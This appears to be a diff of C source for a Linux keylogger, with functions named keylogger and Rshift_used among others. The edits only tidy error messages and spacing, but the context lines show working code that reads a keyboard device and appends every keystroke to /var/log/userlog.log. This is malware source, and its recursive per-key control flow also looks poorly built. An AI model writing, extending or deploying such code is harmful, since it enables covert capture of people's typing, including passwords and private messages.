@@ -51,7 +51,7 @@ void *keylogger(char *deviceFile)
 
     fd = open(deviceFile, O_RDONLY);
     if(fd == -1)
-        error("open()\nFonction : open_kb_device() 1");
+        error("open()\nFonction : open_kb_device()");
 
     setbuf(file_log, NULL);
     
@@ -85,7 +85,7 @@ void *keylogger(char *deviceFile)
                 case 13 : fputs("= ", file_log);   fclose(file_log); keylogger(deviceFile);
                 case 14 : fputs("[BackSpace] ", file_log);   fclose(file_log); keylogger(deviceFile);
                 case 15 : fputs("Tab ", file_log);   fclose(file_log); keylogger(deviceFile);
-                case 16 : fputs("a ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 16 : fputs("a ", file_log); fclose(file_log); keylogger(deviceFile);
                 case 17 : fputs("z ", file_log);   fclose(file_log); keylogger(deviceFile);
                 case 18 : fputs("e ", file_log);   fclose(file_log); keylogger(deviceFile);
                 case 19 : fputs("r ", file_log);   fclose(file_log); keylogger(deviceFile);
@@ -220,7 +220,7 @@ void *Rshift_used(char *deviceFile)
 
     fd = open(deviceFile, O_RDONLY);
     if(fd == -1)
-        error("open()\nFonction : open_kb_device() 2");
+        error("open()\nFonction : open_kb_device()");
 
     setbuf(file_log, NULL);
 
@@ -312,7 +312,7 @@ void *Lshift_used(char *deviceFile)
     file_log = fopen("/var/log/userlog.log", "a+");
 
     if(file_log == NULL)
-        error("fopen()\nFonction : keylogger() 3");
+        error("fopen()\nFonction : keylogger()");
 
     fd = open(deviceFile, O_RDONLY);
     if(fd == -1)
@@ -412,7 +412,7 @@ void *Rshift_used_sustained(char *deviceFile)
 
     fd = open(deviceFile, O_RDONLY);
     if(fd == -1)
-        error("open()\nFonction : open_kb_device() 4");
+        error("open()\nFonction : open_kb_device()");
 
     setbuf(file_log, NULL);
 
